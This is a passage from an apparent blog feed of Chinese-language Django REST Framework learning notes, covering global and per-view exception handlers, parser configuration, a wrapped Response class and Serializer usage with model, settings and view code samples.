为空，就是drf框架处理不了的异常</span></span><br><span class="line">    <span class="keyword">if</span> response <span class="keyword">is</span> <span class="literal">None</span>: <span class="comment">#处理之后为空，再进行自定义的二次处理</span></span><br><span class="line">        <span class="comment"># print(exc)    #错误原因   还可以做更详细的原因，通过判断exc信息类型</span></span><br><span class="line">        <span class="comment"># print(context)  #错误信息</span></span><br><span class="line">        print(<span class="string">'%s - %s - %s'</span> % (context[<span class="string">'view'</span>], context[<span class="string">'request'</span>].method, exc))</span><br><span class="line">        <span class="keyword">return</span> Response(&#123;</span><br><span class="line">            <span class="string">'detail'</span>: <span class="string">'global customized exception: internal server error'</span> <span class="comment"># 全局定制异常：服务器错误</span></span><br><span class="line">        &#125;, status=status.HTTP_500_INTERNAL_SERVER_ERROR, exception=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> response     <span class="comment">#处理之后有值，就直接返回结果</span></span><br></pre></td></tr></table></figure>

<h2 id="自定义局部配置"><a href="#自定义局部配置" class="headerlink" title="自定义局部配置"></a>自定义局部配置</h2><p>这是我拓展的方法，它可以针对某个特定的视图类，定制不同于全局定制异常的特有处理方式。</p>
<p>根据前面的源码分析中可以知道，要为视图类单独定制异常处理函数，可以这样做：</p>
<ol>
<li>在继承<code>APIView</code>编写视图类时，重写父类的<code>get_exception_handler</code>函数，让异常处理函数指向自定义的异常处理函数。</li>
<li>在视图类中加入定制的异常处理函数。</li>
</ol>
<p>示例代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.views.decorators.csrf <span class="keyword">import</span> csrf_exempt</span><br><span class="line"><span class="keyword">from</span> django.utils.decorators <span class="keyword">import</span> method_decorator</span><br><span class="line"><span class="comment"># drf原生处理异常函数取别名 drf_exception_handler</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> exception_handler <span class="keyword">as</span> drf_exception_handler</span><br><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> Response</span><br><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> status</span><br><span class="line"></span><br><span class="line"><span class="meta">@method_decorator(csrf_exempt, name='dispatch')</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LocalExceptionView</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        print(request.query_params)</span><br><span class="line">        print(request.data)</span><br><span class="line">        print(request.not_exists) <span class="comment"># error code</span></span><br><span class="line">        <span class="keyword">return</span> Response(<span class="string">'post ok'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_exception_handler</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.exception_handler</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exception_handler</span><span class="params">(self, exc, context)</span>:</span></span><br><span class="line">        <span class="comment"># drf的exception_handler做基础处理</span></span><br><span class="line">        response = drf_exception_handler(exc, context)</span><br><span class="line">        <span class="comment"># 为空，就是drf框架处理不了的异常</span></span><br><span class="line">        <span class="keyword">if</span> response <span class="keyword">is</span> <span class="literal">None</span>: <span class="comment">#处理之后为空，再进行自定义的二次处理</span></span><br><span class="line">            <span class="comment"># print(exc)    #错误原因   还可以做更详细的原因，通过判断exc信息类型</span></span><br><span class="line">            <span class="comment"># print(context)  #错误信息</span></span><br><span class="line">            print(<span class="string">'%s - %s - %s'</span> % (context[<span class="string">'view'</span>], context[<span class="string">'request'</span>].method, exc))</span><br><span class="line">            <span class="keyword">return</span> Response(&#123;</span><br><span class="line">                <span class="string">'detail'</span>: <span class="string">'local customized exception: internal server error'</span> <span class="comment"># 局部定制异常：服务器错误</span></span><br><span class="line">            &#125;, status=status.HTTP_500_INTERNAL_SERVER_ERROR, exception=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">return</span> response     <span class="comment">#处理之后有值，就直接返回结果</span></span><br></pre></td></tr></table></figure>

<h2 id="测试demo"><a href="#测试demo" class="headerlink" title="测试demo"></a>测试demo</h2><p>测试代码在这里：<a href="">no5_drf_exception</a></p>
<p>其中包含：</p>
<ul>
<li>django项目<ul>
<li>全局定制异常</li>
<li>局部定制异常</li>
</ul>
</li>
<li>postman测试数据包<ul>
<li>全局定制异常测试</li>
<li>局部定制异常测试</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Tech</category>
      </categories>
      <tags>
        <tag>Tech</tag>
        <tag>Backend</tag>
        <tag>Django</tag>
        <tag>Django REST FrameWork</tag>
        <tag>DRF</tag>
        <tag>Learning Notes</tag>
        <tag>Dev</tag>
      </tags>
  </entry>
  <entry>
    <title>Django REST Framework 学习笔记（四）：解析模块 parsers</title>
    <url>/tech/drf-learning-notes-4-the-parsers-module/</url>
    <content><![CDATA[<ul>
<li>Title(EN): <em><strong>Django REST Framework Learning Notes (4): the parsers module</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr>
<h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><ul>
<li>源码：<a href="https://github.com/encode/django-rest-framework/blob/master/rest_framework/parsers.py" target="_blank" rel="noopener"><code>rest_framework.parsers</code></a></li>
<li>官方文档：<span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvcGFyc2Vycy8=">API Guild - Parsers<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hlbGxvX2RyZi90cmVlL21hc3Rlci9ubzRfZHJmX3BhcnNlcg==">本文demo代码Github<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h1 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h1><ol>
<li>drf给我们提供了多种解析数据包方式的解析类<ul>
<li>form-data</li>
<li>x-www-form-urlencoded</li>
<li>json</li>
</ul>
</li>
<li>我们可以通过配置来控制前台提交的哪些格式的数据后台在解析，哪些数据不解析</li>
<li>全局配置就是针对每一个视图类，局部配置就是针对指定的视图来，让它们可以按照配置规则选择性解析数据</li>
</ol>
<h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># APIView类的dispatch方法中</span></span><br><span class="line">request = self.initialize_request(request, *args, **kwargs)  <span class="comment"># 点进去</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#准备要解析的数据</span></span><br><span class="line">parser_context=self.get_parser_context(request)   <span class="comment"># 不是重点</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析模块，获取解析类</span></span><br><span class="line">parsers=self.get_parsers()  <span class="comment"># 点进去</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 去类属性(局部配置) 或 配置文件(全局配置) 拿 parser_classes</span></span><br><span class="line"><span class="keyword">return</span> [parser() <span class="keyword">for</span> parser <span class="keyword">in</span> self.parser_classes]</span><br><span class="line"></span><br><span class="line"><span class="comment"># self.parser_classes为APIView类属性</span></span><br><span class="line">parser_classes = api_settings.DEFAULT_PARSER_CLASSES</span><br><span class="line"></span><br><span class="line"><span class="comment"># api_settings中的解析类</span></span><br><span class="line"><span class="string">'DEFAULT_PARSER_CLASSES'</span>: [</span><br><span class="line">        <span class="string">'rest_framework.parsers.JSONParser'</span>,       <span class="comment"># json数据包</span></span><br><span class="line">        <span class="string">'rest_framework.parsers.FormParser'</span>,       <span class="comment"># x-www-form-urlencoded数据包  </span></span><br><span class="line">        <span class="string">'rest_framework.parsers.MultiPartParser'</span>,  <span class="comment"># form-data数据包</span></span><br><span class="line">],</span><br></pre></td></tr></table></figure>

<h1 id="用法示例"><a href="#用法示例" class="headerlink" title="用法示例"></a>用法示例</h1><h2 id="自定义全局配置"><a href="#自定义全局配置" class="headerlink" title="自定义全局配置"></a>自定义全局配置</h2><p>所有视图类统一处理，在项目的<code>settings.py</code>中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">REST_FRAMEWORK = &#123;</span><br><span class="line">    <span class="comment"># 全局解析类配置</span></span><br><span class="line">    <span class="string">'DEFAULT_PARSER_CLASSES'</span>: [</span><br><span class="line">        <span class="string">'rest_framework.parsers.JSONParser'</span>,       <span class="comment"># json数据包</span></span><br><span class="line">        <span class="string">'rest_framework.parsers.FormParser'</span>,       <span class="comment"># x-www-form-urlencoded数据包</span></span><br><span class="line">        <span class="string">'rest_framework.parsers.MultiPartParser'</span>,  <span class="comment"># form-data数据包</span></span><br><span class="line">    ],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="自定义局部配置"><a href="#自定义局部配置" class="headerlink" title="自定义局部配置"></a>自定义局部配置</h2><p>某一个或一些视图类单独处理，在<code>views.py</code>视图类中提供对应的类属性</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.parsers <span class="keyword">import</span> JSONParser</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Book</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="comment"># 局部解析类配置，只要json类型的数据包才能被解析</span></span><br><span class="line">    parser_classes = [JSONParser]</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<h2 id="测试demo"><a href="#测试demo" class="headerlink" title="测试demo"></a>测试demo</h2><p>测试代码在这里：<a href="">no4_drf_parser</a></p>
<p>其中包含：</p>
<ul>
<li>django项目</li>
<li>postman测试数据包：Body标签页定义了3种格式的数据。在局部设置只能某一种或两种，则在postman其他格式传递的数据都不显示。<ul>
<li>json</li>
<li>x-www-form-urlencoded</li>
<li>form-data</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Tech</category>
      </categories>
      <tags>
        <tag>Tech</tag>
        <tag>Backend</tag>
        <tag>Django</tag>
        <tag>Django REST FrameWork</tag>
        <tag>DRF</tag>
        <tag>Learning Notes</tag>
        <tag>Dev</tag>
      </tags>
  </entry>
  <entry>
    <title>Django REST Framework 学习笔记（六）：响应模块 response</title>
    <url>/tech/drf-learning-notes-6-the-response-module/</url>
    <content><![CDATA[<ul>
<li>Title(EN): <em><strong>Django REST Framework Learning Notes (6): the response module</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr>
<h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><ul>
<li>源码：<a href="hhttps://github.com/encode/django-rest-framework/blob/master/rest_framework/response.py"><code>rest_framework.response</code></a></li>
<li>官方文档：<span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvcmVzcG9uc2VzLw==">API Guild - Exceptions<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><p>响应类构造器：<code>rest_framework.response.Response</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Response</span><span class="params">(SimpleTemplateResponse)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, data=None, status=None,</span></span></span><br><span class="line"><span class="function"><span class="params">                 template_name=None, headers=None,</span></span></span><br><span class="line"><span class="function"><span class="params">                 exception=False, content_type=None)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">            :param data: 响应数据</span></span><br><span class="line"><span class="string">            :param status: http响应状态码</span></span><br><span class="line"><span class="string">            :param template_name: drf也可以渲染页面，渲染的页面模板地址（不用了解）</span></span><br><span class="line"><span class="string">            :param headers: 响应头</span></span><br><span class="line"><span class="string">            :param exception: 是否异常了</span></span><br><span class="line"><span class="string">            :param content_type: 响应的数据格式（一般不用处理，响应头中带了，且默认是json）</span></span><br><span class="line"><span class="string">        """</span></span><br></pre></td></tr></table></figure>

<h1 id="用法示例"><a href="#用法示例" class="headerlink" title="用法示例"></a>用法示例</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># status是解释一堆 数字 网络状态码的模块</span></span><br><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> status</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一般情况下只需要返回数据，status和headers都有默认值</span></span><br><span class="line"><span class="keyword">return</span> Response(data=&#123;数据&#125;, status=status.HTTP_200_OK, headers=&#123;设置的响应头&#125;)</span><br></pre></td></tr></table></figure>

<h1 id="二次封装Response类"><a href="#二次封装Response类" class="headerlink" title="二次封装Response类"></a>二次封装Response类</h1><p>可以自定义APIResponse以便于使用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.response <span class="keyword">import</span> Response</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">APIResponse</span><span class="params">(Response)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, data_status=<span class="number">0</span>, data_msg=<span class="string">'ok'</span>, results=None, http_status=None, headers=None, exception=False, **kwargs)</span>:</span></span><br><span class="line">        <span class="comment"># data的初始状态：状态码与状态信息</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'status'</span>: data_status,</span><br><span class="line">            <span class="string">'msg'</span>: data_msg,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># data的响应数据体</span></span><br><span class="line">        <span class="comment"># results可能是False、0等数据，这些数据某些情况下也会作为合法数据返回</span></span><br><span class="line">        <span class="keyword">if</span> results <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            data[<span class="string">'results'</span>] = results</span><br><span class="line">        <span class="comment"># data响应的其他内容</span></span><br><span class="line">        <span class="comment"># if kwargs is not None:</span></span><br><span class="line">        <span class="comment">#     for k, v in kwargs.items():</span></span><br><span class="line">        <span class="comment">#         setattr(data, k, v)</span></span><br><span class="line">        data.update(kwargs)</span><br><span class="line"></span><br><span class="line">        super().__init__(data=data, status=http_status, headers=headers, exception=exception)   <span class="comment">#重写父类Response的__init__方法</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Tech</category>
      </categories>
      <tags>
        <tag>Tech</tag>
        <tag>Backend</tag>
        <tag>Django</tag>
        <tag>Django REST FrameWork</tag>
        <tag>DRF</tag>
        <tag>Learning Notes</tag>
        <tag>Dev</tag>
      </tags>
  </entry>
  <entry>
    <title>Django REST Framework 学习笔记（七）：序列化模块 serialziers 之 Serialzier类</title>
    <url>/tech/drf-learning-notes-7-the-serialzier-class-in-serialziers-module/</url>
    <content><![CDATA[<ul>
<li>Title(EN): <em><strong>Django REST Framework Learning Notes (7): the Serialzier class in serialziers module</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr>
<h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><ul>
<li>源码：<a href="https://github.com/encode/django-rest-framework/blob/master/rest_framework/serializers.py" target="_blank" rel="noopener"><code>rest_framework.response</code></a></li>
<li>官方文档<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvc2VyaWFsaXplcnMv">API Guild - Serializers<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvZmllbGRzLw==">API Guild - Serializer fields<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvcmVsYXRpb25zLw==">API Guild - Serializer relations<i class="fa fa-external-link-alt"></i></span></li>
</ul>
</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hlbGxvX2RyZi90cmVlL21hc3Rlci9ubzdfZHJmX1NlcmlhbGl6ZXI=">本文demo代码Github<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>DRF常用序列化类主要有</p>
<ul>
<li><code>rest_framework.serialziers.Serializer</code></li>
<li><code>rest_framework.serialziers.ModelSerializer</code></li>
<li><code>rest_framework.serialziers.ListSerializer</code></li>
</ul>
<p>本篇介绍<code>rest_framework.serialziers.Serializer</code></p>
<a id="more"></a>

<h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><p>根据基类<code>rest_framework.serialziers.BaseSerializer</code>构造函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, instance=None, data=empty, **kwargs)</span>:</span></span><br></pre></td></tr></table></figure>

<p>定义好Serialzier类后，就可以创建Serializer对象了。Serializer的构造方法为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Serializer(instance=<span class="literal">None</span>,data=empty,**kwargs)</span><br></pre></td></tr></table></figure>

<ol>
<li>用于序列化时，将模型类对象传入<code>instance</code>参数</li>
<li>用于反序列化时，将要被反序列化的数据传入<code>data</code>参数</li>
<li>除了<code>instance</code>和<code>data</code>参数外，在构造S<code>erializer</code>对象时，还可以通过<code>context</code>参数额外添加数据。通过<code>context</code>参数附加的数据，可以通过<code>Serializer</code>对象的<code>context</code>属性获取。 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">serializer = AccountSerializer(account, context=&#123;<span class="string">'request'</span>:request&#125;)</span><br></pre></td></tr></table></figure>



</li>
</ol>
<h1 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h1><p>序列化器的使用分两个阶段：</p>
<ol>
<li><p>在客户端请求时，使用序列化器可以完成对数据的反序列化（就是前段往后端传递数据，反序列化之后保存数据）</p>
</li>
<li><p>在服务器响应时，使用序列化器可以完成对数据的序列化（服务器取出数据，序列化之后往前段发送展示）</p>
</li>
</ol>
<h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>序列化是将数据返回给前台。DRF的序列化使用流程如下：</p>
<ol>
<li>查询出一个用户对象</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> models <span class="keyword">import</span> user</span><br><span class="line">user = User.object.get(id=<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>构造序列化器对象 </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> user.serializers <span class="keyword">import</span> UserSerializer</span><br><span class="line">user_obj = Userserializer(user)  <span class="comment">#放入查询出的user对象</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>获取序列化对象，通过data属性可以获取序列化后的数据</li>
</ol>
<p>上面查出来的user_ser是一个serializer对象，需要取出具体的数据传给前端，所有要用到 user_ser.data取出具体数据</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">user_ser = Userserializer(user).data</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>如果要被序列化的数据是包含多条数据的（也可以说被[ ]嵌套的，<code>queryset</code>类型数据，不管是多条还是单条）,需要添加<code>many=True</code>参数</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">user = models.User.objects.all()</span><br><span class="line">user_ser =  Userserialzier(user,many=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>自定义序列化属性</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">serializers.SerializerMethodField()</span><br></pre></td></tr></table></figure>


<h2 id="反序列化使用流程"><a href="#反序列化使用流程" class="headerlink" title="反序列化使用流程"></a>反序列化使用流程</h2><p>反序列化是将前天传来的数据数据存入数据库。DRF的反序列化使用流程如下：</p>
<h3 id="数据验证"><a href="#数据验证" class="headerlink" title="数据验证"></a>数据验证</h3><ol>
<li><p>使用序列化器进行反序列化时，需要对数据进行验证后，才能获取验证成功的数据或保存成模型类对象。</p>
</li>
<li><p>在获取反序列化的数据前，必须调用<code>is_valid()</code>方法进行验证，验证成功返回<code>True</code>，否则返回<code>False</code>。</p>
</li>
<li><p>验证失败，可以通过序列化对象的<code>errors</code>属性获取错误信息，返回字典，包含了字段和字段的错误。</p>
</li>
<li><p>验证通过，可以通过序列化器对象的<code>validated_data</code>属性获取数据</p>
</li>
</ol>
<h3 id="保存数据"><a href="#保存数据" class="headerlink" title="保存数据"></a>保存数据</h3><p>序列化类中必须重写<code>create</code>方法用于新增，重写<code>update</code>方法用于修改。视图中使用<code>create</code>和<code>save</code>方法。</p>
<p>从源码可知<code>save</code>方法内部调用的是序列化类中的<code>create</code>方法，所以新增必须要在序列化类中重写<code>create</code>方法。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="用法示例"><a href="#用法示例" class="headerlink" title="用法示例"></a>用法示例</h2><h3 id="序列化-1"><a href="#序列化-1" class="headerlink" title="序列化"></a>序列化</h3><h4 id="模型层-models-py"><a href="#模型层-models-py" class="headerlink" title="模型层 models.py"></a>模型层 <code>models.py</code></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    SEX_CHOICES = [</span><br><span class="line">        [<span class="number">0</span>,<span class="string">'男'</span>],</span><br><span class="line">        [<span class="number">1</span>,<span class="string">'女'</span>],</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    name = models.CharField(max_length=<span class="number">64</span>)</span><br><span class="line">    pwd = models.CharField(max_length=<span class="number">32</span>)</span><br><span class="line">    phone = models.CharField(max_length=<span class="number">11</span>,null=<span class="literal">True</span>,default=<span class="literal">None</span>)</span><br><span class="line">    sex = models.IntegerField(choices=SEX_CHOICES,default=<span class="number">0</span>)</span><br><span class="line">    icon = models.ImageField(upload_to=<span class="string">'icon'</span>,default=<span class="string">'icon/default.jpg'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        db_table=<span class="string">'old_boy_user'</span></span><br><span class="line">        verbose_name=<span class="string">'用户'</span></span><br><span class="line">        verbose_name_plural=verbose_name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'%s'</span> %self.name</span><br></pre></td></tr></table></figure>

<h4 id="配置层-settings-py"><a href="#配置层-settings-py" class="headerlink" title="配置层 settings.py"></a>配置层 <code>settings.py</code></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 注册rest_framework</span></span><br><span class="line">INSTALLED_APPS = [</span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    <span class="string">'rest_framework'</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># media资源</span></span><br><span class="line">MEDIA_URL = <span class="string">'/media/'</span>  <span class="comment"># 后期高级序列化类与视图类，会使用该配置</span></span><br><span class="line">MEDIA_ROOT = os.path.join(BASE_DIR, <span class="string">'media'</span>)  <span class="comment"># media资源路径</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 国际化配置</span></span><br><span class="line">LANGUAGE_CODE = <span class="string">'zh-hans'</span></span><br><span class="line">TIME_ZONE = <span class="string">'Asia/Shanghai'</span></span><br><span class="line">USE_I18N = <span class="literal">True</span></span><br><span class="line">USE_L10N = <span class="literal">True</span></span><br><span class="line">USE_TZ = <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<h4 id="序列化层-api-serializers-py"><a href="#序列化层-api-serializers-py" class="headerlink" title="序列化层 api/serializers.py"></a>序列化层 <code>api/serializers.py</code></h4><ol>
<li><code>api</code>应用下创建<code>serializers.py</code>文件</li>
<li>设置需要返回给前台数据样式 那些<code>model</code>类有对应的字段，不需要返回的就不用设置了</li>
<li>设置方法字段，字段名可以随意，字段值由 <code>get_字段名</code> 提供，来完成一些需要处理在返回的数据，类似于<code>forms</code>组件</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> serializers, exceptions</span><br><span class="line"><span class="keyword">from</span> django.conf <span class="keyword">import</span> settings</span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserSerializer</span><span class="params">(serializers.Serializer)</span>:</span>   <span class="comment">#创建一个序列化类</span></span><br><span class="line">    name = serializers.CharField()      </span><br><span class="line">    phone = serializers.CharField()</span><br><span class="line">    <span class="comment"># 序列化提供给前台的字段个数由后台决定，可以少提供，但是提供的数据库对应的字段，名字一定要与数据库字段相同</span></span><br><span class="line">    <span class="comment"># sex = serializers.IntegerField()</span></span><br><span class="line">    <span class="comment"># icon = serializers.ImageField()</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 自定义序列化属性</span></span><br><span class="line">    <span class="comment"># 属性名随意，值由固定的命名规范方法提供:</span></span><br><span class="line">    <span class="comment">#       get_属性名(self, 参与序列化的model对象)</span></span><br><span class="line">    <span class="comment">#       返回值就是自定义序列化属性的值</span></span><br><span class="line">    gender = serializers.SerializerMethodField()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_gender</span><span class="params">(self, obj)</span>:</span></span><br><span class="line">        <span class="comment"># choice类型的解释型值 get_字段_display() 来访问</span></span><br><span class="line">        <span class="keyword">return</span> obj.get_sex_display()</span><br><span class="line"></span><br><span class="line">　　 <span class="comment">#自定义序列化属性icon</span></span><br><span class="line">    icon = serializers.SerializerMethodField()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_icon</span><span class="params">(self, obj)</span>:</span></span><br><span class="line">        <span class="comment"># settings.MEDIA_URL: 自己配置的 /media/，给后面高级序列化与视图类准备的</span></span><br><span class="line">        <span class="comment"># obj.icon不能直接作为数据返回，因为内容虽然是字符串，但是类型是ImageFieldFile类型</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'%s%s%s'</span> % (<span class="string">r'http://127.0.0.1:8000'</span>, settings.MEDIA_URL, str(obj.icon))</span><br></pre></td></tr></table></figure>

<h4 id="视图层-views-py"><a href="#视图层-views-py" class="headerlink" title="视图层 views.py"></a>视图层 <code>views.py</code></h4><ol>
<li>从数据库中将要序列化给前台的<code>model</code>对象，或是多个<code>model</code>对象查询出来</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">user_obj = models.User.objects.get(pk=pk)</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">user_obj_list = models.User.objects.all()</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>序列化: <code>对象.data</code> 就是可以返回给前台的序列化数据</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> Response(&#123;</span><br><span class="line">    <span class="string">'status'</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">'msg'</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">'results'</span>: user_ser.data</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>完整代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        pk = kwargs.get(<span class="string">'pk'</span>)</span><br><span class="line">        <span class="keyword">if</span> pk:  <span class="comment">#单查</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># 用户对象不能直接作为数据返回给前台</span></span><br><span class="line">                user_obj = models.User.objects.get(pk=pk)</span><br><span class="line">                <span class="comment"># 序列化一下用户对象</span></span><br><span class="line">                user_ser = serializers.UserSerializer(user_obj)</span><br><span class="line">                <span class="keyword">return</span> Response(&#123;</span><br><span class="line">                    <span class="string">'status'</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="string">'msg'</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="string">'results'</span>: user_ser.data   <span class="comment">#如果你在序列化的时候没有.data,那么在传给前端的时候必须要.data</span></span><br><span class="line">                &#125;)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">return</span> Response(&#123;</span><br><span class="line">                    <span class="string">'status'</span>: <span class="number">2</span>,</span><br><span class="line">                    <span class="string">'msg'</span>: <span class="string">'用户不存在'</span>,</span><br><span class="line">                &#125;)</span><br><span class="line">        <span class="keyword">else</span>:  <span class="comment">#群查</span></span><br><span class="line">            <span class="comment"># 用户对象列表(queryset)不能直接作为数据返回给前台</span></span><br><span class="line">            user_obj_list = models.User.objects.all()</span><br><span class="line">            <span class="comment"># 序列化一下用户对象</span></span><br><span class="line">            user_ser_data = serializers.UserSerializer(user_obj_list, many=<span class="literal">True</span>).data</span><br><span class="line">            <span class="keyword">return</span> Response(&#123;</span><br><span class="line">                <span class="string">'status'</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="string">'msg'</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="string">'results'</span>: user_ser_data</span><br><span class="line">            &#125;)</span><br></pre></td></tr></table></figure>

